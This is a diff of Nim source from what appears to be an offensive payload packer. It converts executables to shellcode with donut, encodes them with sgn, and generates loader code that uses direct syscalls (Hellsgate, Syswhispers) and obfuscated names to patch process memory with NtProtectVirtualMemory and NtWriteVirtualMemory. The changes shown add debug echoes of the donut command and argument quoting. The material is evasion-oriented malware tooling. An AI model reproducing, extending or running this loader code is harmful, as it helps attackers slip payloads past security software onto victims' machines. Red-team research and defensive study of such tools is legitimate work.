@@ -621,6 +621,9 @@ if (dllclone and dllProxy):
     echo "Error: You can only use one of --dllclone (Sideloading with Koppeling) or --dllProxy (Proxying through the legitimate DLL)!"
     quit(1)
 
+if (peload and embeddedArguments):
+    verbose = true # workaround, something in DInvoke+NoVerbose breaks the arguments
+
 if (peload or peinject):
     let stream = newFileStream(filename, mode = fmRead)
     defer: stream.close()
@@ -674,7 +677,9 @@ if (peinject):
     if (exist):
         when system.hostOS == "windows":
             if (embeddedArguments):
-                discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -p {arguments} -o tmpshellcode.bin --input:{filename}")
+                echo "Donut command: "
+                echo fmt"{packerPath}\donut\donut -b 1 -p ""{arguments}"" -o tmpshellcode.bin --input:{filename}"
+                discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -p ""{arguments}"" -o tmpshellcode.bin --input:{filename}")
             else:
                 discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -o tmpshellcode.bin --input:{filename}")
             if (sgn):
@@ -684,7 +689,14 @@ if (peinject):
                     discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                 sgn = false
         elif system.hostOS == "linux":
-            discard os.execShellCmd(fmt"donut --input:{filename} -b 1 -o tmpshellcode.bin")
+            if(embeddedArguments):
+                echo "Donut command: "
+                echo fmt"donut --input:{filename} -b 1 -p '{arguments}' -o tmpshellcode.bin"
+                discard os.execShellCmd(fmt"donut --input:{filename} -b 1 -p '{arguments}' -o tmpshellcode.bin")
+            else:
+                echo "Donut command: "
+                echo fmt"donut --input:{filename} -b 1 -o tmpshellcode.bin"
+                discard os.execShellCmd(fmt"donut --input:{filename} -b 1 -o tmpshellcode.bin")
             if (sgn):
                 if (compileX86):
                     discard os.execShellCmd(fmt"{packerPath}/sgn/sgn -c 3  -o tmpshellcode.bin tmpshellcode.bin")
@@ -813,15 +825,12 @@ var {randName}: string = obf("{randValues}")
 let PatchargsFuncs = fmt"""
     var arguments: string = "{arguments}"
     when defined(args):
-        proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
+        proc patchMemory(targetAddr: PVOID, data: openArray[byte]): void =
             var oldProtect: DWORD = 0
             var lpAddress = targetAddr
             var dwSize = cast[SIZE_T](len(data))
             var status: NTSTATUS = 0x00000000
-            when defined(DInvoke):
-                var hProcess = MyGetCurrentProcess()
-            else:
-                var hProcess = GetCurrentProcess()
+            var hProcess = -1
             when defined(Syswhispers):
                 status =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
                 when defined(verbose):
@@ -836,20 +845,17 @@ let PatchargsFuncs = fmt"""
                     if getSyscall(ntProtectTable):                
                         syscall = ntProtectTable.wSysCall
                     else:
-                        when defined(verbose):
-                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                 status =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
                 if (status != 0):
-                    when defined(verbose):
-                        echo obf("[-] Failed to change memory protections.")
-                        echo toHex(status)
+                    echo obf("[-] Failed to change memory protections.")
+                    echo toHex(status)
                 
             when defined(Hellsgate):
                 if getSyscall(ntWriteTable):
                     syscall = ntWriteTable.wSysCall
                 else:
-                    when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
             var scLength: SIZE_T = SIZE_T(len(data))
             var bytesWritten: SIZE_T
                 
@@ -857,16 +863,12 @@ let PatchargsFuncs = fmt"""
                 status = oqiazasusjk(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
             else:
                 status = NtWriteVirtualMemory(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
-                when defined(verbose):
-                    echo obf("NtWriteVirtualMemory: "),toHex(status)
+                echo obf("NtWriteVirtualMemory: "),toHex(status)
                 if (status != 0):
-                    when defined(verbose):
-                        echo obf("[-] Failed to write arguments.")
-                    when defined(verbose):
-                        echo toHex(status)
+                    echo obf("[-] Failed to write arguments.")
+                    echo toHex(status)
                 else:
-                    when defined(verbose):
-                        echo obf("[+] Arguments written successfully.")
+                    echo obf("[+] Arguments written successfully.")
             when defined(Syswhispers):
                 status = uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
             else:
@@ -874,11 +876,10 @@ let PatchargsFuncs = fmt"""
                     if getSyscall(ntProtectTable):                
                         syscall = ntProtectTable.wSysCall
                     else:
-                        when defined(verbose):
-                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                 success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
     when defined(args):
-        proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
+        proc patchArgFunctionMemory(funcAddr: pointer, pNewCommandLine: pointer): void =
             when defined x86:
                 var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
             else:
